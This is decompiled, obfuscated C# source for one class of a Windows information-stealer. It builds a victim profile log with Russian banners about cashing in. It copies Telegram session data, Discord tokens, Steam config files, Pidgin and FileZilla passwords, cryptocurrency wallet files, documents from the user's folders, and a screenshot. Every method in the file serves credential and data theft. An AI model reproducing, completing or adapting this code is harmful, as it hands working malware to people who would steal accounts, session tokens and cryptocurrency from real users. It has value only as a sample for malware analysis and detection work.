﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;
using Stealer;

// Token: 0x02000008 RID: 8
internal class Class4
{
	// Token: 0x0600001A RID: 26 RVA: 0x00003408 File Offset: 0x00001608
	public static void smethod_0(string string_0)
	{
		try
		{
			string text = string.Concat(new string[]
			{
				"◨ ◩ ◪ ◧◨ ◩ ◪ ◧◨ ◩ ◪ ◧\r\nIP: ",
				Program.geo.Split(new char[]
				{
					'?'
				})[0],
				"\r\nCity: ",
				Program.geo.Split(new char[]
				{
					'?'
				})[1],
				"\r\nCountry: ",
				Program.geo.Split(new char[]
				{
					'?'
				})[2],
				"\r\nCountry code: ",
				Program.geo.Split(new char[]
				{
					'?'
				})[3],
				"\r\n————————————————————[ Ебаный рот этого Казино ]————————————————————\r\n\ud83d\udce1 IP: ",
				Program.geo.Split(new char[]
				{
					'?'
				})[0],
				"\r\n\ud83c\udf0e Country Code: ",
				Program.geo.Split(new char[]
				{
					'?'
				})[3],
				"\r\n\ud83d\udd11 Passwords: ",
				Class10.string_0,
				"\r\n\ud83d\udcc3 Cookies: ",
				Class10.VadjZxyuNw,
				"\r\n\ud83d\udcdd Forms: ",
				Class10.string_1,
				"\r\n\ud83e\uddf0 Files: ",
				Class10.string_2,
				" \r\n\ud83c\udf92 FileZilla: ",
				Class10.string_4,
				"\r\n\ud83d\udcb3 Wallets ",
				(Class10.string_6 != "0") ? "✅" : "❌",
				"\r\n\ud83d\udcdf Telegram ",
				(Class10.string_3 != "0") ? "✅" : "❌",
				"\r\n\ud83e\uddff Discord ",
				(Class10.string_7 != "0") ? "✅" : "❌",
				"\r\n\ud83c\udfae Steam ",
				(Class10.string_5 != "0") ? "✅" : "❌",
				"\r\nGet log time: ",
				Program.timerint.ToString(),
				" sec.\r\nStartup path: ",
				Assembly.GetExecutingAssembly().Location.Replace("/", "\\"),
				"\r\n—————————————————————[ $$$ Окупаемся $$$ ]————————————————————\r\nHWID: ",
				Class6.smethod_0(),
				"\r\nUser name: ",
				Environment.UserName,
				"\r\nMachine name: ",
				Environment.MachineName,
				"\r\n"
			});
			try
			{
				string text2 = "";
				string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
				{
					if (registryKey != null)
					{
						try
						{
							string text3 = registryKey.GetValue("ProductName").ToString();
							if (text3 == "")
							{
								text2 = "Error";
							}
							if (text3.Contains("XP"))
							{
								text2 = "XP";
							}
							else if (text3.Contains("7"))
							{
								text2 = "Windows 7";
							}
							else if (text3.Contains("8"))
							{
								text2 = "Windows 8";
							}
							else if (text3.Contains("10"))
							{
								text2 = "Windows 10";
							}
							else if (text3.Contains("2012"))
							{
								text2 = "Windows Server";
							}
							else
							{
								text2 = "Windows";
							}
							goto IL_328;
						}
						catch
						{
							text2 = "Error";
							goto IL_328;
						}
					}
					text2 = "Error";
					IL_328:;
				}
				if (Environment.Is64BitOperatingSystem)
				{
					text2 += " x64";
				}
				else
				{
					text2 += " x32";
				}
				text = text + "Windows version: " + text2 + "\r\n";
			}
			catch
			{
			}
			try
			{
				int width = Screen.PrimaryScreen.Bounds.Width;
				int height = Screen.PrimaryScreen.Bounds.Height;
				text += string.Format("Screen size: {0}x{1}\r\n", width, height);
			}
			catch
			{
			}
			try
			{
				using (ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct").Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						string str = text;
						string str2 = "Antivirus name: ";
						object obj = managementBaseObject["displayName"];
						text = str + str2 + ((obj != null) ? obj.ToString() : null) + "\r\n";
					}
				}
			}
			catch
			{
			}
			try
			{
				using (ManagementObjectCollection managementObjectCollection2 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator2 = managementObjectCollection2.GetEnumerator())
					{
						if (enumerator2.MoveNext())
						{
							ManagementBaseObject managementBaseObject2 = enumerator2.Current;
							object obj2 = managementBaseObject2["Name"];
							string str3 = (obj2 != null) ? obj2.ToString() : null;
							text = text + "CPU name: " + str3 + "\r\n";
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				using (ManagementObjectCollection managementObjectCollection3 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
				{
					foreach (ManagementBaseObject managementBaseObject3 in managementObjectCollection3)
					{
						string str4 = text;
						string str5 = "GPU name: ";
						object obj3 = managementBaseObject3["Caption"];
						text = str4 + str5 + ((obj3 != null) ? obj3.ToString() : null) + "\r\n";
					}
				}
			}
			catch
			{
			}
			text += "――――――――――――――――――――――――――――――――――――――――――――\r\n";
			try
			{
				text += string.Format("Number of running processes: {0}\r\n\r\n", Process.GetProcesses().Length);
				Array.Sort<Process>(Process.GetProcesses(), new Comparison<Process>(Class4.Class5.class5_0.method_0));
				foreach (Process process in Process.GetProcesses())
				{
					if (Process.GetCurrentProcess().Id != process.Id && process.Id != 0)
					{
						text = text + process.ProcessName + "\r\n";
					}
				}
				text += "――――――――――――――――――――――――――――――――――――――――――――";
			}
			catch
			{
			}
			StreamWriter streamWriter = new StreamWriter(string_0);
			streamWriter.Write(text);
			streamWriter.Close();
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}

	// Token: 0x0600001B RID: 27 RVA: 0x00003B98 File Offset: 0x00001D98
	public static void Telegram(string path)
	{
		string text = "";
		Process[] processesByName = Process.GetProcessesByName("Telegram");
		string str = null;
		if (processesByName.Length < 1)
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop"))
			{
				goto IL_B1;
			}
			try
			{
				Process.Start(new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Minimized,
					FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\Telegram.exe"
				});
				Thread.Sleep(1500);
				Process[] processesByName2 = Process.GetProcessesByName("Telegram");
				text = Path.GetDirectoryName(processesByName2[0].MainModule.FileName) + "\\tdata";
				goto IL_B1;
			}
			catch
			{
				goto IL_B1;
			}
		}
		text = Path.GetDirectoryName(processesByName[0].MainModule.FileName) + "\\tdata";
		IL_B1:
		if (Directory.Exists(text))
		{
			string[] files = Directory.GetFiles(text);
			string[] directories = Directory.GetDirectories(text);
			Directory.CreateDirectory(path + "\\tdata");
			Class10.string_3 = "1";
			foreach (string path2 in directories)
			{
				try
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(path2);
					if (Convert.ToInt64(directoryInfo.Name.Length) > 15L)
					{
						Directory.CreateDirectory(path + "\\tdata\\" + directoryInfo.Name);
						str = directoryInfo.Name;
					}
				}
				catch
				{
				}
			}
			foreach (string text2 in files)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(text2);
					if (Convert.ToInt64(fileInfo.Length) < 5000L && fileInfo.Name.Length > 15 && Path.GetExtension(text2) != ".json")
					{
						File.Copy(text2, path + "\\tdata\\" + fileInfo.Name);
					}
				}
				catch (Exception)
				{
				}
			}
			string[] array3 = new string[]
			{
				text + "\\" + str + "\\map0",
				text + "\\" + str + "\\map1"
			};
			try
			{
				if (File.Exists(array3[0]))
				{
					File.Copy(array3[0], path + "\\tdata\\" + str + "\\map0");
				}
			}
			catch
			{
			}
			try
			{
				if (File.Exists(array3[1]))
				{
					File.Copy(array3[1], path + "\\tdata\\" + str + "\\map1");
				}
			}
			catch
			{
			}
		}
	}

	// Token: 0x0600001C RID: 28 RVA: 0x00003E40 File Offset: 0x00002040
	public static void smethod_1(string string_0)
	{
		try
		{
			Directory.CreateDirectory(string_0);
			List<string> list = new List<string>();
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				list.Add(driveInfo.Name);
			}
			list.Add("C:\\Users\\" + Environment.UserName.ToString() + "\\Desktop");
			list.Add("C:\\Users\\" + Environment.UserName.ToString() + "\\Downloads");
			list.Add("C:\\Users\\" + Environment.UserName.ToString() + "\\Documents");
			foreach (string string_ in list.ToArray())
			{
				Class4.smethod_2(string_, string_0);
			}
			Class10.string_2 = Class4.nvjIwSmdq.ToString();
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x0600001D RID: 29 RVA: 0x00003F30 File Offset: 0x00002130
	private static void smethod_2(string string_0, string string_1)
	{
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(string_0).GetFiles())
			{
				if (fileInfo.Extension.Equals(".doc") || fileInfo.Extension.Equals(".docx") || fileInfo.Extension.Equals(".txt") || fileInfo.Extension.Equals(".log") || fileInfo.Extension.Equals(".rdp"))
				{
					fileInfo.CopyTo(string_1 + "\\" + fileInfo.Name);
					Class4.nvjIwSmdq++;
				}
			}
			foreach (DirectoryInfo directoryInfo in new DirectoryInfo(string_0).GetDirectories())
			{
				foreach (FileInfo fileInfo2 in new DirectoryInfo(string_0 + "\\" + directoryInfo.ToString()).GetFiles())
				{
					if (fileInfo2.Extension.Equals(".doc") || fileInfo2.Extension.Equals(".docx") || fileInfo2.Extension.Equals(".txt") || fileInfo2.Extension.Equals(".log") || fileInfo2.Extension.Equals(".rdp"))
					{
						fileInfo2.CopyTo(string_1 + "\\" + fileInfo2.Name);
						Class4.nvjIwSmdq++;
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x0600001E RID: 30 RVA: 0x000040FC File Offset: 0x000022FC
	public static void SaveScreen(string filepath)
	{
		try
		{
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Bitmap bitmap = new Bitmap(width, height);
			Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
			bitmap.Save(filepath, ImageFormat.Png);
		}
		catch
		{
		}
	}

	// Token: 0x0600001F RID: 31 RVA: 0x00004170 File Offset: 0x00002370
	public static void smethod_3(string string_0)
	{
		bool flag = false;
		Directory.CreateDirectory(string_0);
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin").GetFiles())
			{
				if (fileInfo.Extension.Equals(".wallet"))
				{
					Directory.CreateDirectory(string_0 + "\\Bytecoin\\");
					fileInfo.CopyTo(string_0 + "\\Bytecoin\\" + fileInfo.Name);
					flag = true;
				}
			}
		}
		catch
		{
		}
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
			{
				if (File.Exists(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat"))
				{
					Directory.CreateDirectory(string_0 + "\\BitcoinCore\\");
					File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", string_0 + "\\BitcoinCore\\wallet.dat");
					flag = true;
				}
			}
		}
		catch
		{
		}
		try
		{
			using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
			{
				if (File.Exists(registryKey2.GetValue("strDataDir").ToString() + "\\wallet.dat"))
				{
					Directory.CreateDirectory(string_0 + "\\DashCore\\");
					File.Copy(registryKey2.GetValue("strDataDir").ToString() + "\\wallet.dat", string_0 + "\\DashCore\\wallet.dat");
					flag = true;
				}
			}
		}
		catch
		{
		}
		try
		{
			foreach (FileInfo fileInfo2 in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\keystore").GetFiles())
			{
				Directory.CreateDirectory(string_0 + "\\Ethereum\\");
				fileInfo2.CopyTo(string_0 + "\\Ethereum\\" + fileInfo2.Name);
				flag = true;
			}
		}
		catch
		{
		}
		try
		{
			using (RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
			{
				try
				{
					string text = registryKey3.GetValue("wallet_path").ToString().Replace("/", "\\");
					char[] separator = new char[]
					{
						'\\'
					};
					char[] separator2 = new char[]
					{
						'\\'
					};
					if (File.Exists(text))
					{
						Directory.CreateDirectory(string_0 + "\\Monero\\");
						File.Copy(text, string_0 + "\\Monero\\" + text.Split(separator)[text.Split(separator2).Length - 1]);
						flag = true;
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			if (!flag)
			{
				Directory.Delete(string_0);
			}
			else
			{
				Class10.string_6 = "1";
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000020 RID: 32 RVA: 0x000044EC File Offset: 0x000026EC
	public static void smethod_4(string string_0)
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.purple\\accounts.xml";
		StringBuilder stringBuilder = new StringBuilder();
		if (File.Exists(text))
		{
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(new XmlTextReader(text));
				foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
				{
					XmlNode xmlNode = (XmlNode)obj;
					string innerText = xmlNode.ChildNodes[0].InnerText;
					string innerText2 = xmlNode.ChildNodes[1].InnerText;
					string innerText3 = xmlNode.ChildNodes[2].InnerText;
					if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3))
					{
						break;
					}
					stringBuilder.AppendLine("――――――――――――――――――――――――――――――――――――――――――――");
					stringBuilder.AppendLine("Protocol     | " + innerText);
					stringBuilder.AppendLine("Login        | " + innerText2);
					stringBuilder.AppendLine("Password     | " + innerText3);
				}
				if (stringBuilder.Length > 0)
				{
					stringBuilder.AppendLine("――――――――――――――――――――――――――――――――――――――――――――");
					try
					{
						Directory.CreateDirectory(string_0 + "\\");
						File.AppendAllText(string_0 + "\\Pidgin.txt", stringBuilder.ToString());
						Class10.string_8 = "1";
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}

	// Token: 0x06000021 RID: 33 RVA: 0x000046B4 File Offset: 0x000028B4
	public static void Discord(string path)
	{
		try
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage"))
			{
				Directory.CreateDirectory(path);
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage", path + "\\https_discordapp.com_0.localstorage", true);
				Class10.string_7 = "1";
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000022 RID: 34 RVA: 0x00004724 File Offset: 0x00002924
	public static void FileZilla(string path)
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml";
		StringBuilder stringBuilder = new StringBuilder();
		int num = 0;
		try
		{
			if (File.Exists(text))
			{
				try
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(text);
					foreach (object obj in ((XmlElement)xmlDocument.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server"))
					{
						XmlElement xmlElement = (XmlElement)obj;
						string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
						string innerText2 = xmlElement.GetElementsByTagName("Port")[0].InnerText;
						string innerText3 = xmlElement.GetElementsByTagName("User")[0].InnerText;
						string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText));
						if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3) || string.IsNullOrEmpty(@string))
						{
							break;
						}
						stringBuilder.AppendLine("――――――――――――――――――――――――――――――――――――――――――――");
						stringBuilder.AppendLine("Host         | " + innerText + ":" + innerText2);
						stringBuilder.AppendLine("User         | " + innerText3);
						stringBuilder.AppendLine("Password     | " + @string);
						num++;
					}
					if (stringBuilder.Length > 0)
					{
						stringBuilder.AppendLine("――――――――――――――――――――――――――――――――――――――――――――");
						try
						{
							Directory.CreateDirectory(path + "\\");
							File.AppendAllText(path + "\\FileZilla.txt", stringBuilder.ToString());
							Class10.string_4 = num.ToString();
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000023 RID: 35 RVA: 0x0000496C File Offset: 0x00002B6C
	public static void Steam(string path)
	{
		try
		{
			string text = Path.Combine(path, "config");
			string path2 = Path.Combine(Class11.smethod_5("InstallPath", "SourceModInstallPath"), "config");
			if (Directory.Exists(Class11.smethod_5("InstallPath", "SourceModInstallPath")))
			{
				Directory.CreateDirectory(path);
				foreach (string text2 in Directory.GetFiles(Class11.smethod_5("InstallPath", "SourceModInstallPath"), "*."))
				{
					try
					{
						File.Copy(text2, Path.Combine(path, Path.GetFileName(text2)));
					}
					catch
					{
					}
				}
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
					File.AppendAllText(path + "\\Accounts.txt", Class11.smethod_4());
					foreach (string text3 in Directory.GetFiles(path2, "*.vdf"))
					{
						try
						{
							File.Copy(text3, Path.Combine(text, Path.GetFileName(text3)));
						}
						catch
						{
						}
					}
					Class10.string_5 = "1";
				}
			}
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (IOException)
		{
		}
		catch (ArgumentException)
		{
		}
	}

	// Token: 0x06000024 RID: 36 RVA: 0x000022BF File Offset: 0x000004BF
	public static void smethod_5(string string_0)
	{
	}

	// Token: 0x06000025 RID: 37 RVA: 0x0000224C File Offset: 0x0000044C
	public Class4()
	{
		Class13.Cyiv2R6zubiV2();
		base..ctor();
	}

	// Token: 0x06000026 RID: 38 RVA: 0x000022C1 File Offset: 0x000004C1
	// Note: this type is marked as 'beforefieldinit'.
	static Class4()
	{
		Class13.Cyiv2R6zubiV2();
		Class4.nvjIwSmdq = 0;
	}

	// Token: 0x0400000D RID: 13
	private static int nvjIwSmdq;

	// Token: 0x02000009 RID: 9
	[CompilerGenerated]
	[Serializable]
	private sealed class Class5
	{
		// Token: 0x06000027 RID: 39 RVA: 0x000022CE File Offset: 0x000004CE
		// Note: this type is marked as 'beforefieldinit'.
		static Class5()
		{
			Class13.Cyiv2R6zubiV2();
			Class4.Class5.class5_0 = new Class4.Class5();
		}

		// Token: 0x06000028 RID: 40 RVA: 0x0000224C File Offset: 0x0000044C
		public Class5()
		{
			Class13.Cyiv2R6zubiV2();
			base..ctor();
		}

		// Token: 0x06000029 RID: 41 RVA: 0x000022DF File Offset: 0x000004DF
		internal int method_0(Process process_0, Process process_1)
		{
			return process_0.ProcessName.CompareTo(process_1.ProcessName);
		}

		// Token: 0x0400000E RID: 14
		public static readonly Class4.Class5 class5_0;

		// Token: 0x0400000F RID: 15
		public static Comparison<Process> comparison_0;
	}
}
